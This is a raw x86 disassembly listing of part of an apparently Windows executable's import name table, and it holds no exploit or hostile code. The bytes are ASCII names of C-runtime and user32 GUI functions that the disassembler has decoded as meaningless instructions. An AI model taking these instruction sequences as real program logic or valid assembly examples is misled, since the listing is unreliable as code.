  413955:	add    al,0x77
  413957:	arpl   WORD PTR [ebx+0x63],si
  41395a:	push   0xb000072
  41395f:	add    al,0x74
  413961:	outs   dx,DWORD PTR ds:[esi]
  413962:	ja     0x4139d0
  413964:	outs   dx,DWORD PTR ds:[esi]
  413965:	ja     0x4139cc
  413967:	jb     0x413969
  413969:	add    BYTE PTR [ebx+0x735f5f00],dh
  41396f:	gs je  0x4139d1
  413972:	popa   
  413973:	jo     0x4139e5
  413975:	pop    edi
  413976:	je     0x4139f1
  413978:	jo     0x4139df
  41397a:	add    BYTE PTR [eax],al
  41397c:	in     eax,0x3
  41397e:	jae    0x4139f4
  413980:	jb     0x4139e5
  413982:	push   0xa0000072
  413987:	add    BYTE PTR [edi+0x5f],bl
  41398a:	jo     0x4139eb
  41398c:	pop    edi
  41398d:	ins    WORD PTR es:[edi],dx
  41398f:	outs   dx,DWORD PTR ds:[esi]
  413990:	fs add BYTE PTR gs:[eax],al
  413994:	int3   
  413995:	add    esi,DWORD PTR [ecx+0x73]
  413998:	outs   dx,DWORD PTR ds:[esi]
  413999:	jb     0x413a0f
  41399b:	add    BYTE PTR [ebx+0x77736903],ch
  4139a1:	js     0x413a07
  4139a3:	imul   esp,DWORD PTR [edi+0x69],0x3a00074
  4139aa:	imul   esi,DWORD PTR [ebx+0x77],0x68706c61
  4139b1:	popa   
  4139b2:	add    BYTE PTR [eax],al
  4139b4:	fwait
  4139b5:	add    BYTE PTR [edi+0x5f],bl
  4139b8:	jo     0x413a19
  4139ba:	pop    edi
  4139bb:	arpl   WORD PTR [edi+0x6d],bp
  4139be:	ins    DWORD PTR es:[edi],dx
  4139bf:	outs   dx,DWORD PTR ds:[esi]
  4139c0:	fs add BYTE PTR gs:[eax],al
  4139c4:	sub    BYTE PTR [edi+esi*2],al
  4139c7:	arpl   WORD PTR [ebx+0x6e],si
  4139ca:	arpl   WORD PTR [ebp+0x70],bp
  4139cd:	add    BYTE PTR [ebp+0x3],bh
  4139d0:	data16 jb 0x413a38
  4139d3:	add    BYTE PTR gs:[eax],al
  4139d6:	or     al,0x4
  4139d8:	je     0x413a49
  4139da:	ja     0x413a51
  4139dc:	jo     0x413a4e
  4139de:	gs jb  0x4139e1
  4139e1:	add    BYTE PTR [ecx+0x3],bh
  4139e4:	data16 jo 0x413a5c
  4139e7:	je     0x413a5c
  4139e9:	add    BYTE PTR [ebp+0x74656703],cl
  4139ef:	outs   dx,BYTE PTR gs:[esi]
  4139f1:	jbe    0x4139f3
  4139f3:	add    BYTE PTR [eax+0x3],ah
  4139f6:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4139fa:	imul   eax,DWORD PTR [eax],0xffffffff
  4139fd:	add    esi,DWORD PTR [ebx+0x77]
  413a00:	jo     0x413a74
  413a02:	imul   ebp,DWORD PTR [esi+0x74],0xc8000066
  413a09:	add    esi,DWORD PTR [eax+0x75]
  413a0c:	je     0x413a71
  413a0e:	push   0xc9007261
  413a13:	add    esi,DWORD PTR [eax+0x75]
  413a16:	je     0x413a8b
  413a18:	add    BYTE PTR [eax],al
  413a1a:	mov    ecx,0x74626d03
  413a1f:	outs   dx,DWORD PTR ds:[esi]
  413a20:	ja     0x413a85
  413a22:	add    BYTE PTR [eax],al
  413a24:	test   eax,0x77736903
  413a29:	jae    0x413a9b
  413a2b:	popa   
  413a2c:	arpl   WORD PTR [ebp+0x0],sp
  413a2f:	add    BYTE PTR [ecx],cl
  413a31:	add    al,0x74
  413a33:	outs   dx,DWORD PTR ds:[esi]
  413a34:	ins    BYTE PTR es:[edi],dx
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	ja     0x413a9d
  413a38:	jb     0x413a3a
  413a3a:	fild   DWORD PTR [eax]
  413a3c:	pop    edi
  413a3d:	popa   
  413a3e:	ins    DWORD PTR es:[edi],dx
  413a3f:	jae    0x413aa8
  413a41:	pop    edi
  413a42:	gs js  0x413aae
  413a45:	je     0x413a47
  413a47:	add    ch,al
  413a49:	add    esi,DWORD PTR [eax+0x72]
  413a4c:	imul   ebp,DWORD PTR [esi+0x74],0x86000066
  413a53:	add    DWORD PTR [edi+0x69],ebx
  413a56:	outs   dx,BYTE PTR ds:[esi]
  413a57:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x9e006d72
  413a5f:	add    DWORD PTR [edi+0x69],ebx
  413a62:	jae    0x413ad1
  413a64:	bound  esp,QWORD PTR [edx+0x6c]
  413a67:	gs popa 
  413a69:	add    BYTE PTR fs:[eax],al
  413a6c:	push   edx
  413a6d:	add    BYTE PTR [edi+0x58],bl
  413a70:	arpl   WORD PTR [eax+0x74],si
  413a73:	inc    esi
  413a74:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3f10072
  413a7c:	jae    0x413af2
  413a7e:	jb     0x413aee
  413a80:	arpl   WORD PTR [ebp+0x70],bp
  413a83:	add    dl,dl
  413a85:	add    esi,DWORD PTR [edx+0x65]
  413a88:	ins    DWORD PTR es:[edi],dx
  413a89:	outs   dx,DWORD PTR ds:[esi]
  413a8a:	jbe    0x413af1
  413a8c:	add    BYTE PTR [eax],al
  413a8e:	cld    
  413a8f:	add    esi,DWORD PTR [ebx+0x74]
  413a92:	jb     0x413b08
  413a94:	outs   dx,DWORD PTR ds:[esi]
  413a95:	ins    BYTE PTR es:[edi],dx
  413a96:	add    BYTE PTR [eax],al
  413a98:	and    eax,0x73637704
  413a9d:	ins    BYTE PTR es:[edi],dx
  413a9e:	outs   dx,BYTE PTR gs:[esi]
  413aa0:	add    BYTE PTR [eax],al
  413aa2:	and    eax,DWORD PTR [ecx]
  413aa4:	pop    edi
  413aa5:	gs js  0x413b11
  413aa8:	je     0x413aaa
  413aaa:	call   0x65a499af
  413aaf:	js     0x413b1a
  413ab1:	je     0x413ab3
  413ab3:	add    BYTE PTR [ebp+0x73736903],bl
  413ab9:	jo     0x413b1c
  413abb:	arpl   WORD PTR [ebp+0x0],sp
  413abe:	call   0x72b5adc6
  413ac3:	arpl   WORD PTR [eax+0x79],si
  413ac6:	add    BYTE PTR [eax],al
  413ac8:	mov    ch,0x0
  413aca:	pop    edi
  413acb:	pop    edi
  413acc:	jae    0x413b33
  413ace:	je     0x413b45
  413ad0:	jae    0x413b37
  413ad2:	jb     0x413b41
  413ad4:	popa   
  413ad5:	je     0x413b3f
  413ad7:	gs jb  0x413b4c
  413ada:	add    BYTE PTR [eax],al
  413adc:	repnz add esi,DWORD PTR [ebx+0x74]
  413ae0:	jb     0x413b50
  413ae2:	arpl   WORD PTR [eax+0x79],si
  413ae5:	add    BYTE PTR [ebx+eax*1+0x64777369],ah
  413aec:	imul   esp,DWORD PTR [edi+0x69],0xa3000074
  413af3:	add    ebp,DWORD PTR [ecx+0x73]
  413af6:	ja     0x413b5b
  413af8:	je     0x413b73
  413afa:	jo     0x413b61
  413afc:	add    BYTE PTR [eax],al
  413afe:	mov    ch,0x3
  413b00:	ins    DWORD PTR es:[edi],dx
  413b01:	popa   
  413b02:	ins    BYTE PTR es:[edi],dx
  413b03:	ins    BYTE PTR es:[edi],dx
  413b04:	outs   dx,DWORD PTR ds:[esi]
  413b05:	arpl   WORD PTR [eax],ax
  413b07:	add    BYTE PTR [edx+0x0],dh
  413b0a:	pop    edi
  413b0b:	pop    edi
  413b0c:	addr16 gs je 0x413b7d
  413b10:	popa   
  413b11:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413b18:	add    DWORD PTR [ebx+esi*2],eax
  413b1b:	ja     0x413b90
  413b1d:	arpl   WORD PTR [ecx+0x6e],sp
  413b20:	data16 add BYTE PTR [ebp+0x53],cl
  413b24:	push   esi
  413b25:	inc    ebx
  413b26:	push   edx
  413b27:	push   esp
  413b28:	cs fs ins BYTE PTR es:[edi],dx
  413b2b:	ins    BYTE PTR es:[edi],dx
  413b2c:	add    BYTE PTR [eax],al
  413b2e:	xor    eax,0x74654701
  413b33:	dec    ebp
  413b34:	outs   dx,BYTE PTR gs:[esi]
  413b36:	jne    0x413b81
  413b38:	je     0x413b9f
  413b3a:	ins    DWORD PTR es:[edi],dx
  413b3b:	dec    ecx
  413b3c:	outs   dx,BYTE PTR ds:[esi]
  413b3d:	outs   dx,WORD PTR ds:[esi]
  413b3f:	push   edi
  413b40:	add    BYTE PTR [eax],al
  413b42:	sub    BYTE PTR [ecx],al
  413b44:	inc    edi
  413b45:	gs je  0x413b94
  413b48:	popa   
  413b49:	jae    0x413bbf
  413b4b:	inc    ecx
  413b4c:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413b50:	gs push eax
  413b52:	outs   dx,DWORD PTR ds:[esi]
  413b53:	jo     0x413bca
  413b55:	jo     0x413b57
  413b57:	add    dl,ah
  413b59:	add    BYTE PTR [esi+0x69],al
  413b5c:	outs   dx,BYTE PTR ds:[esi]
  413b5d:	fs push edi
  413b5f:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [ebp+0x1],bh
  413b6a:	dec    eax
  413b6b:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x74657261
  413b73:	add    BYTE PTR [esi+0x1],ah
  413b76:	inc    edi
  413b77:	gs je  0x413bcf
  413b7a:	jae    0x413be1
  413b7c:	jb     0x413bcd
  413b7e:	bound  ebp,QWORD PTR [edx+0x65]
  413b81:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  413b85:	outs   dx,WORD PTR ds:[esi]
  413b87:	jb     0x413bf6
  413b89:	popa   
  413b8a:	je     0x413bf5
  413b8c:	outs   dx,DWORD PTR ds:[esi]
  413b8d:	outs   dx,BYTE PTR ds:[esi]
  413b8e:	push   edi
  413b8f:	add    ch,bl
  413b91:	add    BYTE PTR [ebp+0x71],al
  413b94:	jne    0x413bf7
  413b96:	ins    BYTE PTR es:[edi],dx
  413b97:	push   edx
  413b98:	arpl   WORD PTR gs:[eax+eax*1-0x6c],si
  413b9d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  413ba1:	outs   dx,BYTE PTR ds:[esi]
  413ba2:	jae    0x413c10
  413ba4:	popa   
  413ba5:	je     0x413c0c
  413ba7:	inc    ecx
  413ba8:	arpl   WORD PTR [ebx+0x65],sp
  413bab:	ins    BYTE PTR es:[edi],dx
  413bac:	gs jb  0x413c10
  413baf:	je     0x413c20
  413bb1:	jb     0x413c0a
  413bb3:	add    BYTE PTR [esi],bh
  413bb5:	add    BYTE PTR [ebx+0x68],al
  413bb8:	imul   ebp,DWORD PTR [esp+eiz*2+0x57],0x6f646e69
  413bc0:	ja     0x413c08
  413bc2:	jb     0x413c33
  413bc4:	ins    DWORD PTR es:[edi],dx
  413bc5:	push   eax
  413bc6:	outs   dx,DWORD PTR ds:[esi]
  413bc7:	imul   ebp,DWORD PTR [esi+0x74],0x28a0000
  413bce:	push   esp
  413bcf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  413bd7:	ja     0x413c4c
  413bd9:	add    BYTE PTR [esi+0x616f4c01],dh
  413bdf:	fs dec ebp
  413be1:	outs   dx,BYTE PTR gs:[esi]
  413be3:	jne    0x413c26
  413be5:	add    al,al
  413be7:	add    BYTE PTR [ebp+0x6e],al
  413bea:	popa   
  413beb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  413bef:	arpl   WORD PTR [edx+0x6f],si
  413bf2:	ins    BYTE PTR es:[edi],dx
  413bf3:	ins    BYTE PTR es:[edi],dx
  413bf4:	inc    edx
  413bf5:	popa   
  413bf6:	jb     0x413bf8
  413bf8:	xor    al,BYTE PTR [ecx]
  413bfa:	inc    edi
  413bfb:	gs je  0x413c4b
  413bfe:	outs   dx,BYTE PTR gs:[esi]
  413c00:	jne    0x413c4b
  413c02:	je     0x413c69
  413c04:	ins    DWORD PTR es:[edi],dx
  413c05:	inc    ebx
  413c06:	outs   dx,DWORD PTR ds:[esi]
  413c07:	jne    0x413c77
  413c09:	je     0x413c0b
  413c0b:	add    cl,ah
  413c0d:	add    BYTE PTR [esi+0x69],al
  413c10:	outs   dx,BYTE PTR ds:[esi]
  413c11:	fs push edi
  413c13:	imul   ebp,DWORD PTR [esi+0x64],0x41776f
  413c1a:	rol    BYTE PTR [ecx],1
  413c1c:	dec    ebp
  413c1d:	gs jae 0x413c93
  413c20:	popa   
  413c21:	addr16 gs inc edx
  413c24:	outs   dx,DWORD PTR ds:[esi]
  413c25:	js     0x413c6c
  413c27:	js     0x413c80
  413c29:	add    BYTE PTR [eax+0x536e4901],al
  413c2f:	outs   dx,BYTE PTR gs:[esi]
  413c31:	fs dec ebp
  413c33:	gs jae 0x413ca9
  413c36:	popa   
  413c37:	addr16 gs add al,bl
  413c3b:	add    DWORD PTR [ebp+0x6f],ecx
  413c3e:	outs   dx,BYTE PTR ds:[esi]
  413c3f:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  413c47:	push   eax
  413c48:	outs   dx,DWORD PTR ds:[esi]
  413c49:	imul   ebp,DWORD PTR [esi+0x74],0x1680000
  413c50:	inc    edi
  413c51:	gs je  0x413cab
  413c54:	imul   ebp,DWORD PTR [esi+0x64],0x7d00776f
  413c5b:	add    dl,BYTE PTR [ebx+0x68]
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	ja     0x413cb4
  413c61:	arpl   WORD PTR [edx+0x6f],si
  413c64:	ins    BYTE PTR es:[edi],dx
  413c65:	ins    BYTE PTR es:[edi],dx
  413c66:	inc    edx
  413c67:	popa   
  413c68:	jb     0x413c6a
  413c6a:	mov    cl,0x1
  413c6c:	dec    esp
  413c6d:	outs   dx,DWORD PTR ds:[esi]
  413c6e:	popa   
  413c6f:	fs dec ecx
  413c71:	ins    DWORD PTR es:[edi],dx
  413c72:	popa   
  413c73:	addr16 gs inc ecx
  413c76:	add    BYTE PTR [eax],al
  413c78:	cdq    
  413c79:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413c7d:	ins    BYTE PTR es:[edi],dx
  413c7e:	outs   dx,DWORD PTR ds:[esi]
  413c7f:	addr16 inc edx
  413c81:	outs   dx,DWORD PTR ds:[esi]
  413c82:	js     0x413ccd
  413c84:	outs   dx,BYTE PTR ds:[esi]
  413c85:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  413c8d:	jb     0x413cf0
  413c8f:	ins    DWORD PTR es:[edi],dx
  413c90:	inc    ecx
  413c91:	add    ch,al
  413c93:	add    DWORD PTR [ebp+0x61],ecx
  413c96:	jo     0x413cee
  413c98:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413c9f:	gs jns 0x413ce3
  413ca2:	add    BYTE PTR [eax],al
  413ca4:	sbb    BYTE PTR [edx],al
  413ca6:	push   edx
  413ca7:	gs ins DWORD PTR es:[edi],dx
  413ca9:	outs   dx,DWORD PTR ds:[esi]
  413caa:	jbe    0x413d11
  413cac:	push   eax
  413cad:	jb     0x413d1e
  413caf:	jo     0x413d08
  413cb1:	add    BYTE PTR [ecx+eax*1+0x47],ah
  413cb5:	gs je  0x413d0d
  413cb8:	jo     0x413d1e
  413cba:	popa   
  413cbb:	je     0x413d22
  413cbd:	push   edx
  413cbe:	outs   dx,BYTE PTR ds:[si]
  413cc0:	add    BYTE PTR [eax],al
  413cc2:	add    al,BYTE PTR [edx]
  413cc4:	push   edx
  413cc5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  413cce:	popa   
  413ccf:	jae    0x413d44
  413cd1:	inc    ecx
  413cd2:	add    BYTE PTR [eax],al
  413cd4:	add    dl,BYTE PTR ds:[ebx+0x65]
  413cd8:	je     0x413d1e
  413cda:	ins    BYTE PTR es:[edi],dx
  413cdb:	addr16 dec ecx
  413cdd:	je     0x413d44
  413cdf:	ins    DWORD PTR es:[edi],dx
  413ce0:	push   esp
  413ce1:	gs js  0x413d58
  413ce4:	inc    ecx
  413ce5:	add    BYTE PTR [ebp+0x61724400],dh
  413ceb:	ja     0x413d3a
  413ced:	outs   dx,BYTE PTR gs:[esi]
  413cef:	jne    0x413d33
  413cf1:	popa   
  413cf2:	jb     0x413cf4
  413cf4:	sub    eax,DWORD PTR [ecx]
  413cf6:	inc    edi
  413cf7:	gs je  0x413d47
  413cfa:	outs   dx,BYTE PTR gs:[esi]
  413cfc:	jne    0x413cfe
  413cfe:	repnz add DWORD PTR [eax+0x6f],edx
  413d02:	jae    0x413d78
  413d04:	dec    ebp
  413d05:	gs jae 0x413d7b
  413d08:	popa   
  413d09:	addr16 gs push edi
  413d0c:	add    BYTE PTR [eax],al
  413d0e:	push   cs
  413d0f:	add    DWORD PTR [edi+0x65],eax
  413d12:	je     0x413d58
  413d14:	ins    BYTE PTR es:[edi],dx
  413d15:	addr16 inc ebx
  413d17:	je     0x413d8b
  413d19:	ins    BYTE PTR es:[edi],dx
  413d1a:	dec    ecx
  413d1b:	inc    esp
  413d1c:	add    BYTE PTR [eax],al
  413d1e:	mov    cl,0x2
  413d20:	push   esi
  413d21:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  413d25:	push   ebx
  413d26:	arpl   WORD PTR [ecx+0x6e],sp
  413d29:	push   edi
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	sbb    BYTE PTR [ecx],al
  413d2e:	inc    edi
  413d2f:	gs je  0x413d7b
  413d32:	arpl   WORD PTR [edi+0x6e],bp
  413d35:	dec    ecx
  413d36:	outs   dx,BYTE PTR ds:[esi]
  413d37:	outs   dx,WORD PTR ds:[esi]
  413d39:	add    cl,cl
  413d3b:	add    DWORD PTR [ebp+0x61],ecx
  413d3e:	jo     0x413d97
  413d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413d47:	imul   ebp,DWORD PTR [esi+0x74],0x2d0073
  413d4e:	inc    ebx
  413d4f:	push   0x654e7261
  413d54:	js     0x413dca
  413d56:	push   edi
  413d57:	add    BYTE PTR [ecx],ch
  413d59:	add    dl,BYTE PTR [ebx+0x65]
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	fs dec ebp
  413d5f:	gs jae 0x413dd5
  413d62:	popa   
  413d63:	addr16 gs push esp
  413d66:	imul   ebp,DWORD PTR [ebp+0x65],0x4174756f
  413d6d:	add    BYTE PTR [eax],ch
  413d6f:	add    BYTE PTR [ebx+0x68],al
  413d72:	popa   
  413d73:	jb     0x413dc1
  413d75:	outs   dx,DWORD PTR ds:[esi]
  413d76:	ja     0x413ddd
  413d78:	jb     0x413dbc
  413d7a:	jne    0x413de2
  413d7c:	push   di
  413d7e:	add    BYTE PTR [eax],al
  413d80:	ins    DWORD PTR es:[edi],dx
  413d81:	add    DWORD PTR [edi+0x65],eax
  413d84:	je     0x413ddd
  413d86:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  413d8d:	outs   dx,BYTE PTR ds:[esi]
  413d8e:	addr16 push edi
  413d90:	add    BYTE PTR [eax],al
  413d92:	mov    bh,0x2
  413d94:	push   edi
  413d95:	popa   
  413d96:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  413d9e:	jne    0x413e14
  413da0:	dec    ecx
  413da1:	fs ins BYTE PTR es:[edi],dx
  413da3:	add    BYTE PTR gs:[eax],al
  413da6:	mov    DWORD PTR [ecx],0x5670614d
  413dac:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413db3:	gs jns 0x413dfb
  413db6:	js     0x413e0f
  413db8:	add    BYTE PTR [eax],al
  413dba:	cmp    eax,0x65684300
  413dbf:	arpl   WORD PTR [ebx+0x52],bp
  413dc2:	popa   
  413dc3:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413dcb:	outs   dx,BYTE PTR ds:[esi]
  413dcc:	add    BYTE PTR [eax],al
  413dce:	add    eax,0x6c6c4100
  413dd3:	outs   dx,DWORD PTR ds:[esi]
  413dd4:	ja     0x413e29
  413dd6:	gs je  0x413e1f
  413dd9:	outs   dx,DWORD PTR ds:[esi]
  413dda:	jb     0x413e41
  413ddc:	addr16 jb 0x413e4e
  413ddf:	jne    0x413e4f
  413de1:	fs push edi
  413de3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413dea:	into   
  413deb:	add    DWORD PTR [ebp+0x65],ecx
  413dee:	jae    0x413e63
  413df0:	popa   
  413df1:	addr16 gs inc edx
  413df4:	outs   dx,DWORD PTR ds:[esi]
  413df5:	js     0x413e38
  413df7:	add    BYTE PTR [edx],bh
  413df9:	add    DWORD PTR [edi+0x65],eax
  413dfc:	je     0x413e4b
  413dfe:	gs jae 0x413e74
  413e01:	popa   
  413e02:	addr16 gs inc ecx
  413e05:	add    BYTE PTR [edx+0x2],cl
  413e08:	push   ebx
  413e09:	gs je  0x413e59
  413e0c:	outs   dx,BYTE PTR gs:[esi]
  413e0e:	jne    0x413e54
  413e10:	gs popaw 
  413e13:	jne    0x413e81
  413e15:	je     0x413e60
  413e17:	je     0x413e7e
  413e19:	ins    DWORD PTR es:[edi],dx
  413e1a:	add    BYTE PTR [eax],al
  413e1c:	aad    0x1
  413e1e:	dec    ebp
  413e1f:	gs jae 0x413e95
  413e22:	popa   
  413e23:	addr16 gs inc edx
  413e26:	outs   dx,DWORD PTR ds:[esi]
  413e27:	js     0x413e80
  413e29:	add    BYTE PTR [ecx],bh
  413e2b:	add    DWORD PTR [edi+0x65],eax
  413e2e:	je     0x413e7d
  413e30:	outs   dx,BYTE PTR gs:[esi]
  413e32:	jne    0x413e87
  413e34:	je     0x413ea8
  413e36:	imul   ebp,DWORD PTR [esi+0x67],0xb9000057
  413e3d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413e41:	fs dec ebp
  413e43:	outs   dx,BYTE PTR gs:[esi]
  413e45:	jne    0x413e9e
  413e47:	add    BYTE PTR [ecx+eax*1+0x47],bl
  413e4b:	gs je  0x413ea1
  413e4e:	jns    0x413ec3
  413e50:	je     0x413eb7
  413e52:	ins    DWORD PTR es:[edi],dx
  413e53:	dec    ebp
  413e54:	gs je  0x413ec9
  413e57:	imul   esp,DWORD PTR [ebx+0x73],0x2260000
  413e5e:	push   ebx
  413e5f:	outs   dx,BYTE PTR gs:[esi]
  413e61:	fs dec ebp
  413e63:	gs jae 0x413ed9
  413e66:	popa   
  413e67:	addr16 gs inc ecx
  413e6a:	add    BYTE PTR [eax],al
  413e6c:	aaa    
  413e6d:	add    DWORD PTR [edi+0x65],eax
  413e70:	je     0x413ebf
  413e72:	outs   dx,BYTE PTR gs:[esi]
  413e74:	jne    0x413ec9
  413e76:	je     0x413ed9
  413e78:	je     0x413edf
  413e7a:	add    BYTE PTR [eax],al
  413e7c:	mov    bl,0x0
  413e7e:	inc    esp
  413e7f:	jb     0x413ee2
  413e81:	ja     0x413ecc
  413e83:	arpl   WORD PTR [edi+0x6e],bp
  413e86:	add    BYTE PTR [eax],al
  413e88:	xchg   ebp,eax
  413e89:	add    BYTE PTR [ebp+eiz*2+0x73],al
  413e8d:	je     0x413f01
  413e8f:	outs   dx,DWORD PTR ds:[esi]
  413e90:	jns    0x413ed5
  413e92:	jne    0x413f06
  413e94:	jae    0x413f05
  413e96:	jb     0x413e98
  413e98:	add    al,BYTE PTR [eax]
  413e9a:	inc    ecx
  413e9b:	fs push 0x75
  413e9e:	jae    0x413f14
  413ea0:	push   edi
  413ea1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413ea8:	arpl   WORD PTR [eax+eax*1+0x0],si
  413eac:	pop    ecx
  413ead:	add    DWORD PTR [edi+0x65],eax
  413eb0:	je     0x413f05
  413eb2:	jns    0x413f27
  413eb4:	inc    ebx
  413eb5:	outs   dx,DWORD PTR ds:[esi]
  413eb6:	ins    BYTE PTR es:[edi],dx
  413eb7:	outs   dx,DWORD PTR ds:[esi]
  413eb8:	jb     0x413eba
  413eba:	jle    0x413ebd
  413ebc:	dec    eax
  413ebd:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  413ec5:	jne    0x413f10
  413ec7:	je     0x413f2e
  413ec9:	ins    DWORD PTR es:[edi],dx
  413eca:	add    BYTE PTR [eax],al
  413ecc:	or     DWORD PTR [eax],eax
  413ece:	inc    ecx
  413ecf:	jo     0x413f41
  413ed1:	outs   dx,BYTE PTR gs:[esi]
  413ed3:	fs dec ebp
  413ed5:	outs   dx,BYTE PTR gs:[esi]
  413ed7:	jne    0x413f30
  413ed9:	add    BYTE PTR [eax+eax*1],bh
  413edc:	inc    ebx
  413edd:	push   0x4d6b6365
  413ee2:	outs   dx,BYTE PTR gs:[esi]
  413ee4:	jne    0x413f38
  413ee6:	popa   
  413ee7:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  413eef:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  413ef6:	push   ebx
  413ef7:	je     0x413f6b
  413ef9:	imul   ebp,DWORD PTR [esi+0x67],0x21f0057
  413f00:	push   ebx
  413f01:	arpl   WORD PTR [edx+0x6f],si
  413f04:	ins    BYTE PTR es:[edi],dx
  413f05:	ins    BYTE PTR es:[edi],dx
  413f06:	push   edi
  413f07:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f0e:	xor    DWORD PTR [eax],eax
  413f10:	inc    ebx
  413f11:	push   0x72507261
  413f16:	gs jbe 0x413f70
  413f19:	add    BYTE PTR [edi+0x2],bl
  413f1c:	push   ebx
  413f1d:	gs je  0x413f73
  413f20:	jns    0x413f95
  413f22:	inc    ebx
  413f23:	outs   dx,DWORD PTR ds:[esi]
  413f24:	ins    BYTE PTR es:[edi],dx
  413f25:	outs   dx,DWORD PTR ds:[esi]
  413f26:	jb     0x413f9b
  413f28:	add    BYTE PTR [eax],al
  413f2a:	sgdtd  [edi+0x65]
  413f2e:	je     0x413f74
  413f30:	ins    BYTE PTR es:[edi],dx
  413f31:	addr16 dec ecx
  413f33:	je     0x413f9a
  413f35:	ins    DWORD PTR es:[edi],dx
  413f36:	add    BYTE PTR [eax],al
  413f38:	dec    esp
  413f39:	add    dl,BYTE PTR [ebx+0x65]
  413f3c:	je     0x413f8b
  413f3e:	outs   dx,BYTE PTR gs:[esi]
  413f40:	jne    0x413f8b
  413f42:	je     0x413fa9
  413f44:	ins    DWORD PTR es:[edi],dx
  413f45:	inc    edx
  413f46:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x7370
  413f4e:	or     al,0x1
  413f50:	inc    edi
  413f51:	gs je  0x413f98
  413f54:	gs jae 0x413fc2
  413f57:	je     0x413fc8
  413f59:	jo     0x413fb2
  413f5b:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f62:	inc    ebp
  413f63:	add    DWORD PTR [edi+0x65],eax
  413f66:	je     0x413fb8
  413f68:	popa   
  413f69:	jb     0x413fd0
  413f6b:	outs   dx,BYTE PTR ds:[esi]
  413f6c:	je     0x413f6e
  413f6e:	mov    BYTE PTR [eax],0x45
  413f71:	outs   dx,BYTE PTR ds:[esi]
  413f72:	fs push esp
  413f74:	popa   
  413f75:	jae    0x413fe2
  413f77:	add    BYTE PTR [eax+0x0],ah
  413f7a:	inc    ebx
  413f7b:	jb     0x413fe2
  413f7d:	popa   
  413f7e:	je     0x413fe5
  413f80:	dec    ebp
  413f81:	outs   dx,BYTE PTR gs:[esi]
  413f83:	jne    0x413f85
  413f85:	add    bl,dh
  413f87:	add    BYTE PTR [edi+0x65],al
  413f8a:	je     0x413fcf
  413f8c:	popa   
  413f8d:	jb     0x413ff4
  413f8f:	je     0x413fe1
  413f91:	outs   dx,DWORD PTR ds:[esi]
  413f92:	jae    0x413f94
  413f94:	sub    eax,DWORD PTR [edx]
  413f96:	push   ebx
  413f97:	outs   dx,BYTE PTR gs:[esi]
  413f99:	fs dec ebp
  413f9b:	gs jae 0x414011
  413f9e:	popa   
  413f9f:	addr16 gs push edi
  413fa2:	add    BYTE PTR [eax],al
  413fa4:	test   DWORD PTR [ecx],eax
  413fa6:	dec    ecx
  413fa7:	outs   dx,BYTE PTR ds:[esi]
  413fa8:	jae    0x41400f
  413faa:	jb     0x414020
  413fac:	dec    ebp
  413fad:	outs   dx,BYTE PTR gs:[esi]
  413faf:	jne    0x413ffa
  413fb1:	je     0x414018
  413fb3:	ins    DWORD PTR es:[edi],dx
  413fb4:	push   edi
  413fb5:	add    BYTE PTR [ecx+0x0],ah
  413fb8:	inc    ebx
  413fb9:	jb     0x414020
  413fbb:	popa   
  413fbc:	je     0x414023
  413fbe:	push   eax
  413fbf:	outs   dx,DWORD PTR ds:[esi]
  413fc0:	jo     0x414037
  413fc2:	jo     0x414011
  413fc4:	outs   dx,BYTE PTR gs:[esi]
  413fc6:	jne    0x413fc8
  413fc8:	inc    eax
  413fc9:	add    DWORD PTR [edi+0x65],eax
  413fcc:	je     0x41401b
  413fce:	outs   dx,DWORD PTR ds:[esi]
  413fcf:	outs   dx,BYTE PTR ds:[esi]
  413fd0:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  413fd8:	push   edi
  413fd9:	add    al,cl
  413fdb:	add    DWORD PTR [ebp+0x61],ecx
  413fde:	jo     0x414036
  413fe0:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413fe7:	gs jns 0x414041
  413fea:	add    BYTE PTR [eax],al
  413fec:	out    0x0,eax
  413fee:	inc    esi
  413fef:	jb     0x414052
  413ff1:	ins    DWORD PTR es:[edi],dx
  413ff2:	gs push edx
  413ff4:	arpl   WORD PTR gs:[eax+eax*1-0x41],si
  413ff9:	add    BYTE PTR [ebp+0x6e],al
  413ffc:	popa   
  413ffd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4d]
  414001:	outs   dx,BYTE PTR gs:[esi]
  414003:	jne    0x41404e
  414005:	je     0x41406c
  414007:	ins    DWORD PTR es:[edi],dx
  414008:	add    BYTE PTR [eax],al
